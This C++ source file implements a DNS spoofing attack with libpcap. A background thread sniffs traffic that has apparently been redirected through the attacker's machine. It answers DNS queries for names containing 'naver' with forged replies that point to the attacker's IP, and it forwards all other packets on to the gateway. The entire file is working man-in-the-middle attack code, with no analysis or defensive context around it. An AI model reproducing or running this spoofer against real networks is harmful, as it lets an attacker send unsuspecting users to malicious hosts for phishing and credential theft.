#include "dns.h"

Dns::Dns()
{

}

Dns::~Dns()
{

}

void Dns::dns_thread()
{
	thread dnsThread(&Dns::dns_spoof, this);
	dnsThread.detach();
}

bool Dns::dns_spoof()
{
	for (;;)
	{
		if ((data = (uint8_t*)pcap_next(info.dns_handle, &header)) != NULL)
		{
			bool is_forward = true;

			struct ether_header* pEth;
			pEth = (struct ether_header*)data;
			int dataPointer = sizeof(*pEth);

			struct ip_header* pIp;
			pIp = (struct ip_header*)(data + dataPointer);
			dataPointer += sizeof(*pIp);

			if (pIp->protocol == PROTOCOL_UDP)
			{
				struct udp_header* pUdp;
				pUdp = (struct udp_header*)(data + dataPointer);
				dataPointer += sizeof(*pUdp);

				if (ntohs(pUdp->dst_port) == UDP_PORT_DNS)
				{
					struct dns_header* pDns;
					pDns = (struct dns_header*)(data + dataPointer);
					dataPointer += sizeof(*pDns);

					struct dns_questions quest;
					uint8_t* name = (data + dataPointer);
					if (strstr((char*)name, "naver"))
					{
						struct dns_answer answer;

						// Backwarding
						uint8_t test[5000] = { 0 };
						memcpy(pEth->dst_host, info.victim_mac, ETH_LEN);
						memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);
						pEth->ether_type = htons(ETHERTYPE_IP);
						memcpy(test, pEth, sizeof(*pEth));
						dataPointer = sizeof(*pEth);

						memcpy(pIp->src_ip, pIp->dst_ip, IP_LEN);
						memcpy(pIp->dst_ip, info.victim_ip, IP_LEN);
						pIp->total_len = htons(sizeof(*pIp) + sizeof(*pUdp) + sizeof(*pDns) + strlen((char*)name) + sizeof(quest) + sizeof(answer) + 1);
						ip_checksum(pIp);
						memcpy(test + dataPointer, pIp, sizeof(*pIp));
						dataPointer += sizeof(*pIp);

						uint16_t tport = pUdp->src_port;
						pUdp->src_port = pUdp->dst_port;
						pUdp->dst_port = tport;
						pUdp->udp_len += 16;
						pUdp->checksum = 0;
						pUdp->udp_len = htons(sizeof(*pUdp) + sizeof(*pDns) + strlen((char*)name) + sizeof(quest) + sizeof(answer) + 1);
						memcpy(test + dataPointer, pUdp, sizeof(*pUdp));
						dataPointer += sizeof(*pUdp);

						pDns->flags = htons(0x8180);
						pDns->questions = htons(0x0001);
						pDns->answer = htons(0x0001);
						pDns->auth = htons(0x0000);
						pDns->add = htons(0x0000);
						memcpy(test + dataPointer, pDns, sizeof(*pDns));
						dataPointer += sizeof(*pDns);

						quest.q_class = htons(0x0001);
						quest.type = htons(0x0001);
						strcat((char*)(test + dataPointer), (char*)name);
						dataPointer += strlen((char*)name);
						test[dataPointer++] = 0;
						memcpy(test + dataPointer, &quest, sizeof(quest));
						dataPointer += sizeof(quest);

						answer.name = htons(0xc00c);
						answer.type = htons(0x0001);
						answer.q_class = htons(0x0001);
						answer.ttl = htonl(0x0000000e);
						answer.data_len = htons(0x0004);
						memcpy(answer.addr, info.attacker_ip, IP_LEN);
						memcpy(test + dataPointer, &answer, sizeof(answer));
						dataPointer += sizeof(answer);

						//printf("Backwarding\n");
						pcap_sendpacket(info.dns_handle, test, dataPointer);
						is_forward = false;
					}
				}
			}
			if (is_forward)
			{
				memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
				memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);
				memcpy(data, pEth, sizeof(*pEth));

				// Forwarding
				//printf("Forwarding\n");
				pcap_sendpacket(info.dns_handle, data, header.len);
			}
		}
	}
}

void Dns::ip_checksum(_Inout_ struct ip_header* _pIp)
{
	uint16_t* pIps = (uint16_t*)_pIp;
	uint16_t len = (_pIp->header_len) * 4, checksum;
	uint32_t check = 0;

	len >>= 1;
	_pIp->checksum = 0;

	for (int i = 0; i < len; i++)
		check += *pIps++;

	check = (check >> 16) + (check & 0xffff);
	check += (check >> 16);

	checksum = (~check & 0xffff);

	_pIp->checksum = checksum;
}